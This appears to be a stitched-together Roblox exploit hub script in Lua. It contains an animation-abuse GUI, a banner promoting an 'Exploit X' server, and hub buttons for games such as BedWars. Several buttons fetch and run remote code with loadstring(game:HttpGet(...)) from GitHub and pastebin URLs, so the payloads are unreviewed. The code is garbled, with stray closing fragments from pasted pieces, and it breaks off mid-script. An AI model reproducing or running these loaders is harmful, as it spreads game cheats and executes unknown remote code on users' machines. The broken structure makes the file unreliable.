FlingArms.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
FlingArms.Position = UDim2.new(0, 168, 0, 60)
FlingArms.Size = UDim2.new(0, 119, 0, 34)
FlingArms.Font = Enum.Font.Highway
FlingArms.FontSize = Enum.FontSize.Size24
FlingArms.Text = "FlingArms"
FlingArms.TextSize = 20
FlingArms.TextWrapped = true
 
-- Buttons
col = Color3.new(0.886275, 0.776471, 0.368627)
loc = Color3.new(1, 0.906471, 0.568627)
rcol = Color3.new(0.682353, 0.701961, 0.792157)
rloc = Color3.new(0.882353, 0.901961, 0.992157)
 
CloseGUI.MouseButton1Click:connect(function()
MainFrame.Visible = false
SideFrame.Visible = true
SideFrame.Position = MainFrame.Position
end)
 
OpenGUI.MouseButton1Click:connect(function()
MainFrame.Visible = true
SideFrame.Visible = false
MainFrame.Position = SideFrame.Position
end)
 
if (game:GetService"Players".LocalPlayer.Character:WaitForChild("Humanoid").RigType == Enum.HumanoidRigType.R15) then
    ScrollingFrame.Visible = false
    ScrollingFrameR15.Visible = true
    CheckR.Text = "Showing R15 Animations"
else
    ScrollingFrame.Visible = true
    ScrollingFrameR15.Visible = false
    CheckR.Text = "Showing R6 Animations"
end
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://35154961"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local HeadThrowACTIVE = false
HeadThrow.MouseButton1Click:connect(function()
    HeadThrowACTIVE = not HeadThrowACTIVE
    if HeadThrowACTIVE then
        HeadThrow.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if HeadThrowACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        HeadThrow.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://121572214"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local FloatingHeadACTIVE = false
FloatingHead.MouseButton1Click:connect(function()
    FloatingHeadACTIVE = not FloatingHeadACTIVE
    if FloatingHeadACTIVE then
        track:Play(.1, 1, 1)
        FloatingHead.BackgroundColor3 = loc
    else
        track:Stop()
        FloatingHead.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://182724289"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local CrouchACTIVE = false
Crouch.MouseButton1Click:connect(function()
    CrouchACTIVE = not CrouchACTIVE
    if CrouchACTIVE then
        track:Play(.1, 1, 1)
        Crouch.BackgroundColor3 = loc
    else
        track:Stop()
        Crouch.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://282574440"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local FloorCrawlACTIVE = false
FloorCrawl.MouseButton1Click:connect(function()
    FloorCrawlACTIVE = not FloorCrawlACTIVE
    if FloorCrawlACTIVE then
        track:Play(.1, 1, 1)
        FloorCrawl.BackgroundColor3 = loc
    else
        track:Stop()
        FloorCrawl.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://204328711"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local DinoWalkACTIVE = false
DinoWalk.MouseButton1Click:connect(function()
    DinoWalkACTIVE = not DinoWalkACTIVE
    if DinoWalkACTIVE then
        track:Play(.1, 1, 1)
        DinoWalk.BackgroundColor3 = loc
    else
        track:Stop()
        DinoWalk.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://429681631"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local JumpingJacksACTIVE = false
JumpingJacks.MouseButton1Click:connect(function()
    JumpingJacksACTIVE = not JumpingJacksACTIVE
    if JumpingJacksACTIVE then
        track:Play(.1, 1, 1)
        JumpingJacks.BackgroundColor3 = loc
    else
        track:Stop()
        JumpingJacks.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://35154961"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local LoopHeadACTIVE = false
LoopHead.MouseButton1Click:connect(function()
    LoopHeadACTIVE = not LoopHeadACTIVE
    if LoopHeadACTIVE then
        LoopHead.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if LoopHeadACTIVE then
                track:Play(.5, 1, 1e6)
            end
         end
        end
    else
        track:Stop()
        LoopHead.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://184574340"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local HeroJumpACTIVE = false
HeroJump.MouseButton1Click:connect(function()
    HeroJumpACTIVE = not HeroJumpACTIVE
    if HeroJumpACTIVE then
        HeroJump.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if HeroJumpACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        HeroJump.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://181526230"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local FaintACTIVE = false
Faint.MouseButton1Click:connect(function()
    FaintACTIVE = not FaintACTIVE
    if FaintACTIVE then
        track:Play(.1, 1, 1)
        Faint.BackgroundColor3 = loc
    else
        track:Stop()
        Faint.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://181525546"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local FloorFaintACTIVE = false
FloorFaint.MouseButton1Click:connect(function()
    FloorFaintACTIVE = not FloorFaintACTIVE
    if FloorFaintACTIVE then
        FloorFaint.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if FloorFaintACTIVE then
                track:Play(.1, 1, 2)
            end
         end
        end
    else
        track:Stop()
        FloorFaint.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://181525546"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local SuperFaintACTIVE = false
SuperFaint.MouseButton1Click:connect(function()
    SuperFaintACTIVE = not SuperFaintACTIVE
    if SuperFaintACTIVE then
        SuperFaint.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if SuperFaintACTIVE then
                track:Play(.1, 0.5, 40)
            end
         end
        end
    else
        track:Stop()
        SuperFaint.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://313762630"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local LevitateACTIVE = false
Levitate.MouseButton1Click:connect(function()
    LevitateACTIVE = not LevitateACTIVE
    if LevitateACTIVE then
        track:Play(.1, 1, 1)
        Levitate.BackgroundColor3 = loc
    else
        track:Stop()
        Levitate.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://183412246"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local DabACTIVE = false
Dab.MouseButton1Click:connect(function()
    DabACTIVE = not DabACTIVE
    if DabACTIVE then
        Dab.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if DabACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        Dab.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://188632011"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local SpinACTIVE = false
Spinner.MouseButton1Click:connect(function()
    SpinACTIVE = not SpinACTIVE
    if SpinACTIVE then
        Spinner.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if SpinACTIVE then
                track:Play(.1, 1, 2)
            end
         end
        end
    else
        track:Stop()
        Spinner.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://179224234"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local FloatSitACTIVE = false
FloatSit.MouseButton1Click:connect(function()
    FloatSitACTIVE = not FloatSitACTIVE
    if FloatSitACTIVE then
        track:Play(.1, 1, 1)
        FloatSit.BackgroundColor3 = loc
    else
        track:Stop()
        FloatSit.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://429703734"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local MovingDanceACTIVE = false
MovingDance.MouseButton1Click:connect(function()
    MovingDanceACTIVE = not MovingDanceACTIVE
    if MovingDanceACTIVE then
        MovingDance.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if MovingDanceACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        MovingDance.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://215384594"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local WeirdMoveACTIVE = false
WeirdMove.MouseButton1Click:connect(function()
    WeirdMoveACTIVE = not WeirdMoveACTIVE
    if WeirdMoveACTIVE then
        track:Play(.1, 1, 1)
        WeirdMove.BackgroundColor3 = loc
    else
        track:Stop()
        WeirdMove.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://215384594"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local CloneIllusionACTIVE = false
CloneIllusion.MouseButton1Click:connect(function()
    CloneIllusionACTIVE = not CloneIllusionACTIVE
    if CloneIllusionACTIVE then
        track:Play(.5, 1, 1e7)
        CloneIllusion.BackgroundColor3 = loc
    else
        track:Stop()
        CloneIllusion.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://313762630"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local GlitchLevitateACTIVE = false
GlitchLevitate.MouseButton1Click:connect(function()
    GlitchLevitateACTIVE = not GlitchLevitateACTIVE
    if GlitchLevitateACTIVE then
        track:Play(.5, 1, 1e7)
        GlitchLevitate.BackgroundColor3 = loc
    else
        track:Stop()
        GlitchLevitate.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://429730430"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local SpinDanceACTIVE = false
SpinDance.MouseButton1Click:connect(function()
    SpinDanceACTIVE = not SpinDanceACTIVE
    if SpinDanceACTIVE then
        SpinDance.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if SpinDanceACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        SpinDance.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://45834924"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local MoonDanceACTIVE = false
MoonDance.MouseButton1Click:connect(function()
    MoonDanceACTIVE = not MoonDanceACTIVE
    if MoonDanceACTIVE then
        MoonDance.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if MoonDanceACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        MoonDance.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://204062532"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local FullPunchACTIVE = false
FullPunch.MouseButton1Click:connect(function()
    FullPunchACTIVE = not FullPunchACTIVE
    if FullPunchACTIVE then
        FullPunch.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if FullPunchACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        FullPunch.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://186934910"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local SpinDance2ACTIVE = false
SpinDance2.MouseButton1Click:connect(function()
    SpinDance2ACTIVE = not SpinDance2ACTIVE
    if SpinDance2ACTIVE then
        SpinDance2.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if SpinDance2ACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        SpinDance2.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://204292303"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local BowDownACTIVE = false
BowDown.MouseButton1Click:connect(function()
    BowDownACTIVE = not BowDownACTIVE
    if BowDownACTIVE then
        BowDown.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if BowDownACTIVE then
                track:Play(.1, 1, 3)
            end
         end
        end
    else
        track:Stop()
        BowDown.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://204295235"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local SwordSlamACTIVE = false
SwordSlam.MouseButton1Click:connect(function()
    SwordSlamACTIVE = not SwordSlamACTIVE
    if SwordSlamACTIVE then
        SwordSlam.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if SwordSlamACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        SwordSlam.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://204295235"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local LoopSlamACTIVE = false
LoopSlam.MouseButton1Click:connect(function()
    LoopSlamACTIVE = not LoopSlamACTIVE
    if LoopSlamACTIVE then
        LoopSlam.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if LoopSlamACTIVE then
                track:Play(.1, 1, 1e4)
            end
         end
        end
    else
        track:Stop()
        LoopSlam.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://184574340"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local MegaInsaneACTIVE = false
MegaInsane.MouseButton1Click:connect(function()
    MegaInsaneACTIVE = not MegaInsaneACTIVE
    if MegaInsaneACTIVE then
        MegaInsane.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if MegaInsaneACTIVE then
                track:Play(.1, 0.5, 40)
            end
         end
        end
    else
        track:Stop()
        MegaInsane.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://126753849"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local SuperPunchACTIVE = false
SuperPunch.MouseButton1Click:connect(function()
    SuperPunchACTIVE = not SuperPunchACTIVE
    if SuperPunchACTIVE then
        SuperPunch.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if SuperPunchACTIVE then
                track:Play(.1, 1, 3)
            end
         end
        end
    else
        track:Stop()
        SuperPunch.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://218504594"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local FullSwingACTIVE = false
FullSwing.MouseButton1Click:connect(function()
    FullSwingACTIVE = not FullSwingACTIVE
    if FullSwingACTIVE then
        FullSwing.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if FullSwingACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        FullSwing.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://259438880"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local ArmTurbineACTIVE = false
ArmTurbine.MouseButton1Click:connect(function()
    ArmTurbineACTIVE = not ArmTurbineACTIVE
    if ArmTurbineACTIVE then
        track:Play(.1, 1, 1e3)
        ArmTurbine.BackgroundColor3 = loc
    else
        track:Stop()
        ArmTurbine.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://136801964"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local BarrelRollACTIVE = false
BarrelRoll.MouseButton1Click:connect(function()
    BarrelRollACTIVE = not BarrelRollACTIVE
    if BarrelRollACTIVE then
        BarrelRoll.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if BarrelRollACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        BarrelRoll.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://180612465"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local ScaredACTIVE = false
Scared.MouseButton1Click:connect(function()
    ScaredACTIVE = not ScaredACTIVE
    if ScaredACTIVE then
        Scared.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if ScaredACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        Scared.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://33796059"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local InsaneACTIVE = false
Insane.MouseButton1Click:connect(function()
    InsaneACTIVE = not InsaneACTIVE
    if InsaneACTIVE then
        track:Play(.1, 1, 1e8)
        Insane.BackgroundColor3 = loc
    else
        track:Stop()
        Insane.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://33169583"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local ArmDetachACTIVE = false
ArmDetach.MouseButton1Click:connect(function()
    ArmDetachACTIVE = not ArmDetachACTIVE
    if ArmDetachACTIVE then
        ArmDetach.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if ArmDetachACTIVE then
                track:Play(.1, 1, 1e6)
            end
         end
        end
    else
        track:Stop()
        ArmDetach.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://35978879"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local SwordSliceACTIVE = false
SwordSlice.MouseButton1Click:connect(function()
    SwordSliceACTIVE = not SwordSliceACTIVE
    if SwordSliceACTIVE then
        track:Play(.1, 1, 1)
        SwordSlice.BackgroundColor3 = loc
    else
        track:Stop()
        SwordSlice.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://27432691"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local InsaneArmsACTIVE = false
InsaneArms.MouseButton1Click:connect(function()
    InsaneArmsACTIVE = not InsaneArmsACTIVE
    if InsaneArmsACTIVE then
        InsaneArms.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if InsaneArmsACTIVE then
                track:Play(.1, 1, 1e4)
            end
         end
        end
    else
        track:Stop()
        InsaneArms.BackgroundColor3 = col
    end
end)
-- R15
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://674871189"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local CrazySlashACTIVE = false
CrazySlash.MouseButton1Click:connect(function()
    CrazySlashACTIVE = not CrazySlashACTIVE
    if CrazySlashACTIVE then
        CrazySlash.BackgroundColor3 = rloc
        while wait() do
         if track.IsPlaying == false then
            if CrazySlashACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        CrazySlash.BackgroundColor3 = rcol
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://582855105"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local OpenACTIVE = false
Open.MouseButton1Click:connect(function()
    OpenACTIVE = not OpenACTIVE
    if OpenACTIVE then
        Open.BackgroundColor3 = rloc
        while wait() do
         if track.IsPlaying == false then
            if OpenACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        Open.BackgroundColor3 = rcol
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://754658275"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local R15SpinnerACTIVE = false
R15Spinner.MouseButton1Click:connect(function()
    R15SpinnerACTIVE = not R15SpinnerACTIVE
    if R15SpinnerACTIVE then
        R15Spinner.BackgroundColor3 = rloc
        while wait() do
         if track.IsPlaying == false then
            if R15SpinnerACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        R15Spinner.BackgroundColor3 = rcol
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://582384156"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local ArmsOutACTIVE = false
ArmsOut.MouseButton1Click:connect(function()
    ArmsOutACTIVE = not ArmsOutACTIVE
    if ArmsOutACTIVE then
        ArmsOut.BackgroundColor3 = rloc
        while wait() do
         if track.IsPlaying == false then
            if ArmsOutACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        ArmsOut.BackgroundColor3 = rcol
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://717879555"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local FloatSlashACTIVE = false
FloatSlash.MouseButton1Click:connect(function()
    FloatSlashACTIVE = not FloatSlashACTIVE
    if FloatSlashACTIVE then
        FloatSlash.BackgroundColor3 = rloc
        while wait() do
         if track.IsPlaying == false then
            if FloatSlashACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        FloatSlash.BackgroundColor3 = rcol
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://708553116"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
WeirdZombieACTIVE = false
WeirdZombie.MouseButton1Click:connect(function()
    WeirdZombieACTIVE = not WeirdZombieACTIVE
    if WeirdZombieACTIVE then
        WeirdZombie.BackgroundColor3 = rloc
        while wait() do
         if track.IsPlaying == false then
            if WeirdZombieACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        WeirdZombie.BackgroundColor3 = rcol
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://746398327"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
DownSlashACTIVE = false
DownSlash.MouseButton1Click:connect(function()
    DownSlashACTIVE = not DownSlashACTIVE
    if DownSlashACTIVE then
        DownSlash.BackgroundColor3 = rloc
        while wait() do
         if track.IsPlaying == false then
            if DownSlashACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        DownSlash.BackgroundColor3 = rcol
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://675025795"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
PullACTIVE = false
Pull.MouseButton1Click:connect(function()
    PullACTIVE = not PullACTIVE
    if PullACTIVE then
        Pull.BackgroundColor3 = rloc
        while wait() do
         if track.IsPlaying == false then
            if PullACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        Pull.BackgroundColor3 = rcol
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://698251653"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
CircleArmACTIVE = false
CircleArm.MouseButton1Click:connect(function()
    CircleArmACTIVE = not CircleArmACTIVE
    if CircleArmACTIVE then
        CircleArm.BackgroundColor3 = rloc
        while wait() do
         if track.IsPlaying == false then
            if CircleArmACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        CircleArm.BackgroundColor3 = rcol
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://696096087"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
BendACTIVE = false
Bend.MouseButton1Click:connect(function()
    BendACTIVE = not BendACTIVE
    if BendACTIVE then
        Bend.BackgroundColor3 = rloc
        while wait() do
         if track.IsPlaying == false then
            if BendACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        Bend.BackgroundColor3 = rcol
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://675025570"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
RotateSlashACTIVE = false
RotateSlash.MouseButton1Click:connect(function()
    RotateSlashACTIVE = not RotateSlashACTIVE
    if RotateSlashACTIVE then
        RotateSlash.BackgroundColor3 = rloc
        while wait() do
         if track.IsPlaying == false then
            if RotateSlashACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        RotateSlash.BackgroundColor3 = rcol
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://754656200"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
FlingArmsACTIVE = false
FlingArms.MouseButton1Click:connect(function()
    FlingArmsACTIVE = not FlingArmsACTIVE
    if FlingArmsACTIVE then
        FlingArms.BackgroundColor3 = rloc
        while wait() do
         if track.IsPlaying == false then
            if FlingArmsACTIVE then
                track:Play(.1, 1, 10)
            end
         end
        end
    else
        track:Stop()
        FlingArms.BackgroundColor3 = rcol
    end
end)
 
-- Finished update!
    print("Clicked")
end)

game.StarterGui:SetCore("SendNotification",  {
 Title = " GearTycoon Hub";
 Text = "Made by GearV4. Join Exploit X Server Now!!!";
 Icon = "";
 Duration = 30;
})

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ScreenGui"
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

local Toggle = Instance.new("TextButton")
Toggle.Name = "Toggle"
Toggle.Parent = ScreenGui
Toggle.BackgroundColor3 = Color3.fromRGB(138, 3, 3)
Toggle.Position = UDim2.new(0, 0, 0.454706937, 0)
Toggle.Size = UDim2.new(0, 90, 0, 38)
Toggle.Font = Enum.Font.SourceSans
Toggle.Text = "GUI"
Toggle.TextColor3 = Color3.fromRGB(248, 248, 248)
Toggle.TextSize = 28.000
Toggle.Draggable = true
Toggle.MouseButton1Click:connect(function()
    Library:ToggleUI()
end)

local Corner = Instance.new("UICorner")
Corner.Name = "Corner"
Corner.Parent = Toggle
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]



Tab:AddButton({
	Name = "NecTroVerse",
	Callback = function()
-- Made By KHANTELL on roblox, Creation TEAM NectoVerse
-- Launcher Link: loadstring(game:HttpGet(('https://raw.githubusercontent.com/Cortzalno666/NectoVerse-Industries-Data/master/NectoLauncher.lua'),true))()
-- The Creator username is KHANTELL in roblox
-- The creator username is gearv4_ in discord

-- RELEASED IN SCRIPT BLOX!

-- V0.0.1
-- NectoLauncher Status: Online
-- NectoAPI Status: Online
-- NectoVerse Status: Online
-- NectoHub: Online

-- Loading Library And Window
local DrRayLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()
local window = DrRayLibrary:Load("NectoLauncher V0.0.1", "Default")
-- Tab Creation
local tab = DrRayLibrary.newTab("Launcher", "ImageIdHere")
tab.newLabel("Credits to GearV4: https://discord.gg/aPevmdnnge")
-- Netless
tab.newLabel("User Netless because some scripts might be unusable. ")
tab.newButton("Launch Netless", "Launch it", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/Cu7bKQWN'),true))()
      print('Netless Launched')
end)
-- Input For fun
tab.newInput("Fun Feature", "This is just for fun, nothing interesting. ", function(text)
    print("Entered text: " .. text)
end)
-- Launching button
tab.newButton("Launch NectoHub", "NectoHub Launcher V0.0.1", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Cortzalno666/NectoVerse-Industries-Data/master/NectoHub.lua'))()
      print('NectoHub V2 Launched')
end)

tab.newLabel("Status Tab")
tab.newLabel("Nectolauncher: Online")
tab.newLabel("NectoAPI: Online")
tab.newLabel("NectoHub: Online")

local tab = DrRayLibrary.newTab("Warning!", "ImageIdHere")
tab.newLabel("We find safe and working scripts for everyone, Some may not work for some reason if they're server are down. if they dont work for some reason please dont blame us but you can contact our DC Server from Launcher tab.")

window:Open()
window:Close()
window:Hide()
window:Show()	
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

local Tab2 = Window:MakeTab({
	Name = "BedWars",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

local Tab = Tab2:AddSection({
	Name = "Script Bedwars"
})

--[[
Name = <string> - The name of the section.
]]

Tab2:AddButton({
	Name = "Goku Hub",
	Callback = function()
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Goku Hub", "DarkTheme")

-- MAIN
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")


